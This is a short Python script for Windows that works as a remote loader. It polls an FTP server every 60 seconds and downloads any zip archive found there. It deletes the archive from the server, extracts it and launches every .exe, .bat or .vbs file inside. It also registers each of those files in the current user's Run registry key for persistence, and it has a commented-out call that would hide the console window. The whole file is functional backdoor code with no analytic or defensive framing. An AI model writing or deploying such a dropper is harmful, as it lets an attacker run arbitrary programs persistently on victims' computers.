import win32console,win32gui;#win32gui.ShowWindow(win32console.GetConsoleWindow(),0)
import os,os.path,ftplib,time,sys,winreg,stat,wget,zipfile

host="host"
username="username"
passwrd="password"
url="ftp://"+username+":"+passwrd+"@"+host+"/"

def start_up(curfile):
		kdey=winreg.OpenKey(winreg.HKEY_CURRENT_USER,r"Software\Microsoft\Windows\CurrentVersion\Run",0,winreg.KEY_ALL_ACCESS)
		winreg.SetValueEx(kdey,sys.argv[0].split("\\")[::-1][0],0,winreg.REG_SZ,curfile)

try:
	ftp=ftplib.FTP(host,username,passwrd)
	print("[#] Connected")
except :
	print("[-] Retrying after 60 sec ...")
	time.sleep(60)
	try:
		ftp=ftplib.FTP(host,username,passwrd)
		print("[#] Connected")
	except:
		print("[X] Could not connect");time.sleep(10)
		exit(0)

while True:
	for file in ftp.nlst():
		print("[-] Checking %s"%file)
		if file.split(".")[::-1][0]=="zip":
			wget.download(url+str(file))
			ftp.delete(file)
			zipfile.ZipFile(file).extractall()
			for fall in zipfile.ZipFile(file).namelist():
				if fall.split(".")[::-1][0]=="exe":
					print("[#] Starting UP")
					start_up(fall)
					print("[#] Starting File")
					os.startfile(fall)
				elif fall.split(".")[::-1][0]=="bat":
					print("[#] Starting UP")
					start_up(fall)
					print("[#] Starting File")
					os.startfile(fall)
				elif fall.split(".")[::-1][0]=="vbs":
					print("[#] Starting UP")
					start_up(fall)
					print("[#] Starting File")
					os.startfile(fall)
	print("[-] Waiting for 60 sec ...")
	time.sleep(60)
	




